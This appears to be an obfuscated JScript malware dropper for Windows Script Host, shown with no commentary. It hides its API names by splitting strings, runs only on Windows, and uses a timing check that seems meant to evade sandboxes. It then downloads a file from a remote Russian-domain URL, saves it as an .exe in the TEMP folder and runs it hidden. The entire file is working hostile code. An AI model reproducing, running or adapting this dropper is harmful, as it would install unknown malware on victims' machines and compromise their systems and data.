var PZ = false;
var ST = "Create"+"Object";
var QU = function F() {return WScript[ST]("WScript"+".Shell");}(), AQ = 11;
var LR = "MSXML2"+".XMLHTTP";
var V = 2;
var RB = V - 2;
function YY(H){QU["Run"](H, RB, RB);};
function K(){return LR + "";};
function PG(H0, FI){RB = RB * 1; return H0 - FI;};
function TQ(){return ST;};
/*@cc_on
  @if (@_win32 || @_win64)
    PZ = true;
  @end
@*/
if (PZ)
{
var Y = "";
function CM(){return 22;};
var G = 0; var D = 0;
function N()
{
var IQ = new this["Date"]();
var Q = IQ["getUTCMilliseconds"]();
WScript["Sleep"](CM());
var IQ = new this["Date"]();
var PM = IQ["getUTCMilliseconds"]();
WScript["Sleep"](CM());
var IQ = new this["Date"]();
var E = IQ["getUTCMilliseconds"]();
var G = "UX";
G = PG(PM, Q);
var D = "HS";
D = PG(E, PM);
Y = "open";
return PG(G, D);
}
var UP = false;
var Y0 = false;
for (var S = RB; S < CM() * 1; S++){if (N() != RB){
UP = true; 
D = "31" + 11 * G + D; 
Y0 = true; 
break;
}}
function W() {return ((UP == true) && (UP == Y0)) ? 1 : RB;};
if (UP && W() && Y0){
function HE() {return QU["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "INzlLa6t.ex" + "e";};
 ON = K();
 CI = WScript[ST](ON);
 var OM = 1;
do { 
	for (;OM;){
	try {
		if (OM == 1)
		{
			CI[Y]("GET", "http://new.teamlight.ru/si8svf", false);
			CI["send"]();
			M = "Sleep";
			OM = 2;
		}
		WScript[M](CM() + 120); 
		if (CI["readystate"] < 2 * 2) continue;
		OM = RB;
		function Z(SY) {var SN = (1, 2, 3, 4, 5, SY); return SN;};
		OG = WScript[TQ()]("ADODB.Stream");
		ON = OG;
		ON[Y]();
		ON["type"] = Z(1);
		ON["write"](CI["ResponseBody"]);
		OG["position"] = Z(RB);
		ON["Save" + "ToFile"](HE(), 2);
		OG["cl"+"ose"]();
		EF = HE();
		YY(EF);
	} catch(S0){};};
}while (OM);
}
}

